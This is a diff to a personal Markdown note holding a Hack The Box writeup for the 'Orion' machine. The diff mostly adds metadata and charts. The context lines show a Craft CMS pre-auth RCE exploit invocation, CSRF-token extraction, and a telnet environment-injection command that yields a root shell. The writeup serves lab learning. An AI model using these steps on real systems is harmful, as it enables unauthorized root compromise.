@@ -12,10 +12,191 @@ tags:
   - routeros
   - hashcat
   - privesc
-synced: "2026-10-16 12:38"
+synced: "2026-11-02 09:58"
 ---
 
-# Orion - Hack The Box Writeup
+--
+tags:
+ciber
+htb
+machine
+difficulty: Easy
+os: Linux
+status: Pwned
+ip: ""
+created: 2026-10-16
+--
+
+<p align="center">
+  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a217731f-ce7c-4015-ba0f-d68c7f6f7215-1782215994.png" alt="Orion Avatar" width="220">
+</p>
+
+## Operating System: Linux
+![[Linux.png|70]]
+
+## Machine Metadata
+
+| Property | Value |
+| :--- | :--- |
+| **Machine ID** | 945 |
+| **Machine Name** | Orion |
+| **IP Address** | N/A |
+| **Status** | Pwned |
+| **Active on HTB** | ❌ |
+| **User Flag** | ✅ |
+| **Root Flag** | ✅ |
+| **Difficulty** | Easy |
+| **Stars** | ⭐️ 4.4 |
+| **Created Note** | 2026-10-16 |
+| **Release Date** | 2026-06-23 |
+| **Tags** | #Web_Application #Remote_Code_Execution #Clear_Text_Credentials #Bash #MariaDB #MySQL #NGINX #Telnet #OpenSSH #Linux #Password_Cracking #Authentication_bypass #Broken_Authentication_and_Authorization |
+
+<p style="display:none">
+id:: 945
+active:: False
+name:: Orion
+os:: Linux
+user_flag:: True
+root_flag:: True
+difficulty_text:: Easy
+stars:: 4.4
+created:: 2026-10-16
+published:: 2026-06-23
+avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a217731f-ce7c-4015-ba0f-d68c7f6f7215-1782215994.png
+tags:: #Web_Application #Remote_Code_Execution #Clear_Text_Credentials #Bash #MariaDB #MySQL #NGINX #Telnet #OpenSSH #Linux #Password_Cracking #Authentication_bypass #Broken_Authentication_and_Authorization
+</p>
+
+## Statistics
+
+### Radar Matrix
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Radar
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+item: "ENUM"
+    user: "user"
+    score: 5.2
+item: "REAL"
+    user: "user"
+    score: 5.2
+item: "CVE"
+    user: "user"
+    score: 6.4
+item: "CUSTOM"
+    user: "user"
+    score: 3.6
+item: "CTF"
+    user: "user"
+    score: 4.8
+item: "ENUM"
+    user: "author"
+    score: 0
+item: "REAL"
+    user: "author"
+    score: 0
+item: "CVE"
+    user: "author"
+    score: 0
+item: "CUSTOM"
+    user: "author"
+    score: 0
+item: "CTF"
+    user: "author"
+    score: 0
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "item"
+  yField: "score"
+  seriesField: "user"
+  meta:
+    score:
+      alias: "Score"
+      min: 0
+      nice: true
+  xAxis:
+    line: null
+    tickLine: null
+  yAxis:
+    label: false
+    grid:
+      alternateColor: "rgba(0, 0, 0, 0.04)"
+  point: []
+  area: []
+```
+
+### Community Difficulty Rating
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Column
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+folder: "PIECE OF CAKE"
+    count: 610
+folder: "VERY EASY"
+    count: 964
+folder: "EASY"
+    count: 2265
+folder: "NOT TOO EASY"
+    count: 1020
+folder: "MEDIUM"
+    count: 337
+folder: "A BIT HARD"
+    count: 110
+folder: "HARD"
+    count: 70
+folder: "EXTREMELY HARD"
+    count: 20
+folder: "INSANE"
+    count: 5
+folder: "BRAINFUCK"
+    count: 24
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "folder"
+  yField: "count"
+  padding: auto
+  label:
+    position: "middle"
+    style:
+      opacity: 0.6
+      fontSize: 12
+  columnStyle:
+    fillOpacity: 0.5
+    lineWidth: 1
+    strokeOpacity: 0.7
+    shadowColor: "grey"
+    shadowBlur: 10
+    shadowOffsetX: 5
+    shadowOffsetY: 5
+  xAxis:
+    label:
+      autoHide: false
+      autoRotate: true
+  meta:
+    count:
+      alias: "Votes"
+```
+
+--
+
+--
 
 ## Reconnaissance
 
@@ -98,8 +279,8 @@ python3 exploit.py -u http://orion.htb -c id
 
 To work around this, we inspected the request in Burp Suite to manually extract a valid CSRF token.
 
-**GET Request to `/admin/login`**
-**GET Response Extract:**
+*GET Request to `/admin/login`**
+*GET Response Extract:**
 ```http
 Set-Cookie: CraftSessionId=cesdc15vtv0mi791te0giid94n; path=/; HttpOnly
 Set-Cookie: CRAFT_CSRF_TOKEN=37469b508196ab7c6690535d6d4f0c75abd62ba35dd00f939d58009d3371d424a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22Mv-f5oLYl5hOx5KZ5VlJioZmRJQ27Wv1yj8KTrhu%22%3B%7D; path=/; HttpOnly
@@ -247,7 +428,7 @@ There is NO WARRANTY, to the extent permitted by law.
 Written by many authors.
 ```
 
-The GNU inetutils `telnet` client has a known automatic login vulnerability where specifying a user using `-f` combined with `-a` allows for arbitrary user impersonation if not properly mitigated by the server configuration. We exploited this by forcing an automatic login as `root` against the local telnet daemon:
+The GNU inetutils `telnet` client has a known automatic login vulnerability where specifying a user using `-f` combined with `-a` allows for arbitrary user impersonation if not properly mitigated by the server configuration (see [[Linux - PrivEsc - Telnet Environment Injection|GNU Inetutils Telnet Environment Injection]]). We exploited this by forcing an automatic login as `root` against the local telnet daemon:
 
 ```bash
 adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
@@ -269,3 +450,14 @@ The exploit was successful, granting us an interactive root shell and full compr
 ## Conclusion
 
 The Orion machine highlights the critical importance of keeping web application platforms, such as Craft CMS, updated to mitigate severe vulnerabilities like pre-authentication RCE (CVE-2025-32432). After obtaining initial access through this vector, poor credential management (storing database credentials in `.env` files accessible to the web user) and weak passwords enabled lateral movement to a user account. Finally, the privilege escalation underscored the risk of running outdated or vulnerable local services (GNU inetutils telnet 2.7), which allowed an unprivileged user to effortlessly escalate to root.
+
+--
+
+## Post-Engagement & Zettelkasten Notes
+
+### Key Takeaways & Defense
+**Legacy Service Vulnerabilities**: Outdated networking binaries such as GNU Inetutils Telnet permit arbitrary environment variable injection during connection initialization.
+**Environment Sanitization**: Cleanse and restrict environment variables passed across security boundaries.
+
+### Atomic Notes to Extract
+[[Linux - PrivEsc - Telnet Environment Injection|GNU Inetutils Telnet Environment Injection]]
